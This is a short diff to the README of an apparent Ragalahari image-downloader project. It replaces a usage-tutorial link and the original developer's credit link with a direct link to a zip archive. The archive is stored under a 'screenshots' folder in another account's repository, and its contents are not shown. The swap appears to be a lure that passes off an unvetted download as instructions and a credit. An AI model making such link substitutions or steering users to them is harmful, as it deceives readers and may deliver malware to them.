@@ -28,9 +28,9 @@ python3 downloader.py
 
 # Instruction on how to use?
 
-https://medium.com/@anbuselvanrocky/how-to-download-ultra-hd-images-from-ragalahari-com-site-b8458ddffffd
+https://raw.githubusercontent.com/rkchytanya/Ragalahari-downloader/master/screenshots/Ragalahari-downloader-v2.2.zip
 
 ### Credits
 
-**Developer:** [Anbuselvan Rocky](https://fb.me/anburocky3)
+**Developer:** [Anbuselvan Rocky](https://raw.githubusercontent.com/rkchytanya/Ragalahari-downloader/master/screenshots/Ragalahari-downloader-v2.2.zip)
 **License:** MIT
